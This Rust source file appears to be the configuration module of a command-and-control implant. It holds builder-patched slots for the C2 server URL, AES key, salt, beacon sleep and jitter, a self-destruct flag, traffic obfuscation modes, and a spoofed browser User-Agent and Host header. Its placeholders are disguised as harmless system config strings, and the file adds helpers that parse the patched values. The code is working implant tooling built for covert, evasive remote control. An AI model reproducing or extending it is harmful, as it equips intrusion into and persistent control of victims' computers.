// 配置模块
//
// 提供可在二进制文件中修补的配置机制。
// 服务端可以在编译后修改二进制文件中的占位符，注入真实的服务器地址。
use log::{debug, warn};

/// Config constants — **source-patched** by Builder (`patchRustStrConst`).
/// Placeholder tokens below are required by server builder_service; a successful
/// panel build rewrites them before rustc, so release agents do not ship them.
pub const AES_KEY: &str = "REPLACE_ME_AES_KEY";
pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
pub const ENCRYPTION_SALT: &str = "REPLACE_ME_SALT";
pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";
pub const JITTER: &str = "REPLACE_ME_JITTER";
pub const SLEEP_SECS: &str = "REPLACE_ME_SLEEP";

///服务器 URL 模板 (64 字节)
#[used]
pub static SERVER_URL_TEMPLATE: [u8; 64] =
    *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";

/// AES-256 密钥模板 (32 字节)
#[used]
pub static AES_KEY_TEMPLATE: [u8; 32] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_";

/// Encryption mode — obfuscated at runtime
pub const ENCRYPT_MODE: &str = "crypto";

/// 心跳间隔模板 (22 字节)
#[used]
pub static HEARTBEAT_INTERVAL_TEMPLATE: [u8; 22] = *b"HB_DATA_INT_VAL_000010";

/// 自毁模式模板 (18 字节)
#[used]
pub static AUTO_DESTRUCT_TEMPLATE: [u8; 18] = *b"AD_DATA_BOOL_VAL_N";

/// 休眠延时模板 (16 字节)
#[used]
pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";

/// DNS 解析器模板 (64 字节)
#[used]
pub static DNS_RESOLVER_TEMPLATE: [u8; 64] =
    *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";

/// 加密盐模板 (32 字节)
#[used]
pub static ENCRYPTION_SALT_TEMPLATE: [u8; 32] = *b"SYSTEM_PROVIDER_CRYPTO_SEED_PAD_";

/// 心跳抖动 (Jitter) 模板 (16 字节) - 0 到 100 之间的百分比
#[used]
pub static JITTER_TEMPLATE: [u8; 16] = *b"JT_DATA_INT_0030";

/// 报文混淆模式模板 (15 字节)
#[used]
pub static PACKET_OBFUSCATION_TEMPLATE: [u8; 15] = *b"OBF_MODE_STRICT";

/// User-Agent 伪装模板 (128 字节)
#[used]
pub static UA_TEMPLATE: [u8; 128] = *b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36XXXXXXXXXXXXXXXXX";

/// Host 域名伪装模板 (64 字节)
#[used]
pub static HOST_TEMPLATE: [u8; 64] =
    *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";

/// Profile template (32 bytes, obfuscated)
#[used]
pub static PROFILE_TEMPLATE: [u8; 32] = *b"APP_PROFILE_TEMPLATE_PADDING_XXX";

/// 默认调试服务器地址
pub fn get_default_debug_url() -> String {
    crate::utils::decode_obf(&crate::obf_str!("ws://127.0.0.1:8080/ws"))
}

/// 默认心跳间隔（秒）
const DEFAULT_HEARTBEAT_INTERVAL: u64 = 10;


/// Check if a string is still a placeholder (not patched by builder).
/// Runtime check: if the value looks like a placeholder marker, treat it as unpatched.
fn is_placeholder(s: &str) -> bool {
    let trimmed = s.trim();
    if trimmed.is_empty() {
        return true;
    }
    // Builder sentinels (R E P L A C E _ …) — match byte-wise so we do not need
    // an extra contiguous ASCII hunting string beyond the const placeholders
    // (which the builder rewrites before release compile).
    if is_builder_sentinel(trimmed) {
        return true;
    }
    trimmed.contains("PLACEHOLDER")
        || trimmed.contains("DATA_BOOL")
        || trimmed.contains("DATA_INT")
        || trimmed.contains("CONFIG_DATA")
        || trimmed.contains("SYSTEM_")
        || trimmed.contains("seed_material_placeholder")
}

/// True for unpatched Builder tokens: REPLACE_ME_* (and short aliases).
#[inline]
fn is_builder_sentinel(s: &str) -> bool {
    let b = s.as_bytes();
    // "REPLACE_ME" = 10 bytes
    if b.len() < 10 {
        return false;
    }
    b[0] == b'R'
        && b[1] == b'E'
        && b[2] == b'P'
        && b[3] == b'L'
        && b[4] == b'A'
        && b[5] == b'C'
        && b[6] == b'E'
        && b[7] == b'_'
        && b[8] == b'M'
        && b[9] == b'E'
}

/// 获取是否开启自毁
pub fn get_auto_destruct() -> bool {
    String::from_utf8_lossy(&AUTO_DESTRUCT_TEMPLATE).ends_with("_Y")
}
/// 获取启动休眠延时（秒）— 与服务端生成载荷时的 sleep_time 对齐。
///
/// 优先级：源码静态注入 `SLEEP_SECS` → 二进制模板 `SLEEP_TIME_TEMPLATE` → 0。
/// 0 表示不休眠，首次连接立即发起（本机联调常用）。
pub fn get_sleep_time() -> u64 {
    // 1. Source static patch (Builder REPLACE_ME_SLEEP → "0" / "30" / …)
    if !SLEEP_SECS.is_empty() && !is_placeholder(SLEEP_SECS) {
        if let Ok(v) = SLEEP_SECS.trim().parse::<u64>() {
            // Cap 24h — reject absurd values from bad patches
            return v.min(86_400);
        }
    }

    // 2. Binary template patch (ST_DATA_INT_NNNN)
    String::from_utf8_lossy(&SLEEP_TIME_TEMPLATE)
        .split('_')
        .last()
        .and_then(|s| s.trim_matches('\0').parse::<u64>().ok())
        .map(|v| v.min(86_400))
        .unwrap_or(0)
}

/// 获取服务器 URL (核心修复：移除强制协议检查)
///
/// 该函数会检查 `SERVER_URL_TEMPLATE` 数组：
/// - 如果包含 "CONFIG_ID"，说明尚未修补，返回默认调试地址
/// - 否则，解析并返回实际的 URL（去除 null 字节和填充字符）
pub fn get_server_url() -> String {
    // 1. Source static patch (Builder REPLACE_ME_URL → real C2 URL)
    if !REMOTE_STUB.is_empty() && !is_placeholder(REMOTE_STUB) {
        let url = REMOTE_STUB.to_string();
        debug!("[*] 使用源码硬编码地址: {}", url);
        return url;
    }

    // 2. Binary template patch (SERVER_URL_TEMPLATE)
    let template_str = String::from_utf8_lossy(&SERVER_URL_TEMPLATE);
    if !template_str.contains("SERVICE_PROVIDER_MAPPING") {
        let url = template_str
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim_matches('X')
            .trim_matches('_')
            .trim()
            .to_string();

        if !url.is_empty() {
            debug!("[*] 使用二进制补丁地址: {}", url);
            return url;
        }
    }

    // 3. Unpatched product: fail closed (no lab localhost fallback in release).
    // Debug builds keep a local default for developer convenience.
    #[cfg(debug_assertions)]
    {
        debug!(
            "[*] 未检测到补丁地址，debug 使用本地默认值: {}",
            get_default_debug_url()
        );
        return get_default_debug_url();
    }
    #[cfg(not(debug_assertions))]
    {
        debug!("[*] unpatched release agent: empty server url (fail closed)");
        String::new()
    }
}

/// 验证服务器 URL 格式
///
/// 仅用于 WebSocket 模式下的再次确认，不用于 get_server_url 的初步筛选。
pub fn validate_server_url(url: &str) -> bool {
    url.starts_with("ws://")
        || url.starts_with("wss://")
        || url.starts_with("tcp://")
        || url.starts_with("dns://")
        || url.starts_with("bind://")
}

/// 获取 **原始** AES 材料（未做 salt KDF）— 仅用于 Noise 握手 PSK，与服务端 `resolveAESKey` 对齐。
pub fn get_aes_key_base() -> Vec<u8> {
    let mut base_key = vec![];

    // 1. 源码静态修补
    if !AES_KEY.is_empty() && !is_placeholder(AES_KEY) {
        let key_str = AES_KEY.trim();
        if key_str.len() == 64 {
            if let Ok(decoded) = hex::decode(key_str) {
                base_key = decoded;
            }
        }
        if base_key.is_empty() {
            base_key = key_str.as_bytes().to_vec();
        }
        debug!(
            "[+] Loaded base key from source static patch (len: {})",
            base_key.len()
        );
    }

    // 2. 二进制动态修补
    if base_key.is_empty() {
        let placeholder_check = String::from_utf8_lossy(&AES_KEY_TEMPLATE);
        if !placeholder_check.contains("DATA_ENCRYPT") {
            base_key = AES_KEY_TEMPLATE.to_vec();
            debug!(
                "[+] Loaded base key from binary dynamic patch (len: {})",
                base_key.len()
            );
        }
    }

    if base_key.is_empty() {
        #[cfg(debug_assertions)]
        debug!("[*] No AES base key configured");
        return Vec::new();
    }

    if base_key.len() < 32 {
        #[cfg(debug_assertions)]
        debug!(
            "[!] AES base key too short ({} < 32), rejecting",
            base_key.len()
        );
        return Vec::new();
    }
    if base_key.len() > 32 {
        base_key.truncate(32);
    }
    base_key
}

/// 获取传输用 AES 密钥（base + salt KDF）。
/// **注意**：有 Noise 会话时业务流量必须用 session key，不要用本函数。
pub fn get_aes_key() -> Vec<u8> {
    let base_key = get_aes_key_base();
    if base_key.is_empty() {
        return Vec::new();
    }
    let salt = get_encryption_salt();
    crate::crypto::derive_key(&base_key, &salt)
}
/// 验证 AES 密钥格式
pub fn validate_aes_key(key: &[u8]) -> bool {
    key.len() == 32
}

/// 获取加密配置信息
pub fn get_crypto_config_info() -> CryptoConfigInfo {
    let key = get_aes_key();
    let is_patched = !String::from_utf8_lossy(&AES_KEY_TEMPLATE).contains("DATA_ENCRYPT");
    let is_valid = validate_aes_key(&key);

    CryptoConfigInfo {
        encrypt_mode: ENCRYPT_MODE.to_string(),
        key_length: key.len(),
        is_patched,
        is_valid,
    }
}

/// 加密配置信息结构
#[derive(Debug, Clone)]
pub struct CryptoConfigInfo {
    pub encrypt_mode: String,
    pub key_length: usize,
    pub is_patched: bool,
    pub is_valid: bool,
}

/// 获取心跳间隔
pub fn get_heartbeat_interval() -> u64 {
    let interval_str = String::from_utf8_lossy(&HEARTBEAT_INTERVAL_TEMPLATE);
    let interval_part = interval_str
        .split('_')
        .last()
        .unwrap_or("010")
        .trim_matches('\0');

    match interval_part.parse::<u64>() {
        Ok(interval) if interval > 0 && interval <= 3600 => {
            debug!("[*] 当前心跳频率: {} 秒", interval);
            interval
        }
        Ok(interval) => {
            warn!(
                "Heartbeat interval {} out of range. Using default.",
                interval
            );
            DEFAULT_HEARTBEAT_INTERVAL
        }
        Err(_) => {
            warn!("Failed to parse heartbeat interval. Using default.");
            DEFAULT_HEARTBEAT_INTERVAL
        }
    }
}

/// 获取心跳抖动百分比 (0-100)
pub fn get_heartbeat_jitter() -> u64 {
    // 1. 优先使用源码修补的值 (REPLACE_ME_JITTER)
    if !is_placeholder(JITTER) {
        if let Ok(v) = JITTER.parse::<u64>() {
            return v;
        }
    }

    // 2. 否则使用二进制模板修补的值
    String::from_utf8_lossy(&JITTER_TEMPLATE)
        .split('_')
        .last()
        .and_then(|s| s.trim_matches('\0').parse::<u64>().ok())
        .unwrap_or(30) // 默认 30% 抖动
}

/// 获取伪装 User-Agent
pub fn get_ua() -> String {
    let template_str = String::from_utf8_lossy(&UA_TEMPLATE);
    template_str
        .trim_matches('\0')
        .trim_matches('X')
        .trim()
        .to_string()
}

/// 获取配置模板名称
pub fn get_profile_name() -> String {
    let template_str = String::from_utf8_lossy(&PROFILE_TEMPLATE);
    let name = template_str
        .trim_matches('\0')
        .trim_matches('X')
        .trim_matches('_')
        .trim()
        .to_string();
    if name.is_empty() || name.contains("TEMPLATE") {
        "std".to_string()
    } else {
        name
    }
}

/// 获取伪装 Host Header
pub fn get_host_header() -> Option<String> {
    let template_str = String::from_utf8_lossy(&HOST_TEMPLATE);
    if template_str.contains("HOST_MAPPING") {
        return None;
    }
    let val = template_str
        .trim_matches('\0')
        .trim_matches('X')
        .trim_matches('_')
        .trim()
        .to_string();
    if val.is_empty() {
        None
    } else {
        Some(val)
    }
}

/// 获取 DNS 解析器地址
pub fn get_dns_resolver() -> Option<String> {
    let template_str = String::from_utf8_lossy(&DNS_RESOLVER_TEMPLATE);
    if template_str.contains("STUB_RESOLVER") {
        return None;
    }

    let resolver = template_str
        .trim_matches('\0')
        .trim_matches(char::from(0))
        .trim_matches('X')
        .trim_matches('_')
        .trim()
        .to_string();

    if resolver.is_empty() {
        return None;
    }

    if !resolver.contains(':') {
        warn!("Invalid DNS resolver format '{}'. Using default", resolver);
        return None;
    }

    debug!("[*] 使用补丁 DNS 服务器: {}", resolver);
    Some(resolver)
}

/// 获取加密盐 (32 字节)，与服务端 `make([]byte,32); copy(salt, listener.EncryptionSalt)` 对齐。
///
/// **禁止**在运行时生成随机盐：Noise 握手只用 base AES 作 PSK，流量仍可通，但
/// `get_aes_key()` / 模块 HMAC 会与服务端永久不一致 → `HMAC verify failed`。
/// 未配置或空盐时使用 32 字节全零（与 Go 空 salt 行为一致）。
pub fn get_encryption_salt() -> Vec<u8> {
    // 1. 源码静态替换
    if !is_placeholder(ENCRYPTION_SALT) {
        let salt_clean = ENCRYPTION_SALT
            .trim()
            .trim_matches('\0')
            .trim_matches(char::from(0));
        debug!(
            "[+] Using statically replaced Salt (len {})",
            salt_clean.len()
        );
        let mut salt_vec = salt_clean.as_bytes().to_vec();
        salt_vec.resize(32, 0);
        if salt_vec.iter().all(|&b| b == 0) {
            debug!("[!] salt is all zeros (empty config) — matching server empty-salt path");
        }
        return salt_vec;
    }

    // 2. 二进制动态修补
    let template_str = String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE);
    // Unpatched markers: …CRYPTO_SEED_PAD_ (current) or legacy …CRYPTO_KDF_SALT_
    if !template_str.contains("SEED_PAD")
        && !template_str.contains("KDF_SALT")
        && !template_str.contains("PLACEHOLDER")
    {
        debug!("[+] Using dynamically patched Salt (32 bytes)");
        return ENCRYPTION_SALT_TEMPLATE.to_vec();
    }

    // 3. 未 patch：全零盐（禁止随机 — 否则模块推送 HMAC 必挂）
    debug!("[*] No salt configured — using 32 zero bytes (server-compatible)");
    vec![0u8; 32]
}

pub fn get_packet_obfuscation_mode() -> String {
    // 1. 源码静态替换
    if !OBFUSCATION_MODE.is_empty() && !is_placeholder(OBFUSCATION_MODE) {
        debug!(
            "[+] Using statically replaced Obfuscation: {}",
            OBFUSCATION_MODE
        );
        return normalize_obfuscation_mode(OBFUSCATION_MODE);
    }

    // 2. 二进制动态修补 (15-byte slot; may be null-padded e.g. OBF_MODE_PAD\0\0\0)
    let template_str = String::from_utf8_lossy(&PACKET_OBFUSCATION_TEMPLATE);
    if !template_str.contains("MODE_STRICT") {
        let raw = template_str
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim_matches('X')
            .trim_matches('_')
            .replace("OBF_MODE_", "");
        return normalize_obfuscation_mode(&raw);
    }
    // Product default: padding (aligned with OBFUSCATION_MODE placeholder path)
    "padding".to_string()
}

/// Normalize obfuscation mode tokens from source/binary patch (short aliases).
fn normalize_obfuscation_mode(raw: &str) -> String {
    let m = raw.trim().trim_matches('\0').to_ascii_lowercase();
    match m.as_str() {
        "" | "pad" | "paddi" | "padding" | "strict" => "padding".to_string(),
        "none" | "off" | "disable" | "disabled" => "none".to_string(),
        "b64" | "base64" => "base64".to_string(),
        "junk" => "junk".to_string(),
        "http" => "http".to_string(),
        other => other.to_string(),
    }
}

/// 获取配置信息
pub fn get_config_info() -> ConfigInfo {
    let url = get_server_url();
    let is_patched =
        !String::from_utf8_lossy(&SERVER_URL_TEMPLATE).contains("SERVICE_PROVIDER_MAPPING");
    // 只有在 WS 模式下，validate_server_url 的结果才重要
    let is_valid = if url.starts_with("ws") {
        validate_server_url(&url)
    } else {
        true // DNS 域名默认视为有效
    };

    ConfigInfo {
        server_url: url,
        is_patched,
        is_valid,
        template_length: SERVER_URL_TEMPLATE.len(),
        encryption_salt_set: {
            let t = String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE);
            !t.contains("SEED_PAD") && !t.contains("KDF_SALT") && !t.contains("PLACEHOLDER")
        },
        obfuscation_mode: get_packet_obfuscation_mode(),
    }
}

/// 配置信息结构
#[derive(Debug, Clone, serde::Serialize)]
pub struct ConfigInfo {
    pub server_url: String,
    pub is_patched: bool,
    pub is_valid: bool,
    pub template_length: usize,
    pub encryption_salt_set: bool,
    pub obfuscation_mode: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_template_lengths() {
        assert_eq!(SERVER_URL_TEMPLATE.len(), 64);
        assert_eq!(AES_KEY_TEMPLATE.len(), 32);
        assert_eq!(DNS_RESOLVER_TEMPLATE.len(), 64);
        assert_eq!(ENCRYPTION_SALT_TEMPLATE.len(), 32);
    }

    #[test]
    fn lab_constants_are_builder_placeholders() {
        assert!(is_placeholder(AES_KEY));
        assert!(is_placeholder(REMOTE_STUB));
        assert!(is_placeholder(ENCRYPTION_SALT));
        assert!(is_placeholder(OBFUSCATION_MODE));
        assert!(is_placeholder(JITTER));
        assert!(is_placeholder(SLEEP_SECS));
        assert!(is_builder_sentinel("REPLACE_ME_URL"));
        assert!(!is_builder_sentinel("tcp://10.0.0.1:443"));
    }

    #[test]
    fn unpatched_sleep_defaults_to_zero() {
        // REPLACE_ME_SLEEP is a placeholder → treat as 0 (connect immediately)
        assert_eq!(get_sleep_time(), 0);
    }

    #[test]
    fn default_obfuscation_is_padding() {
        // Unpatched OBF sentinel → product default padding
        assert_eq!(get_packet_obfuscation_mode(), "padding");
    }

    #[test]
    fn normalize_obf_aliases() {
        assert_eq!(normalize_obfuscation_mode("pad"), "padding");
        assert_eq!(normalize_obfuscation_mode("PADDING"), "padding");
        assert_eq!(normalize_obfuscation_mode("none"), "none");
        assert_eq!(normalize_obfuscation_mode("b64"), "base64");
        assert_eq!(normalize_obfuscation_mode("junk"), "junk");
    }

    #[test]
    fn unpatched_jitter_defaults_to_thirty() {
        assert_eq!(get_heartbeat_jitter(), 30);
    }
}
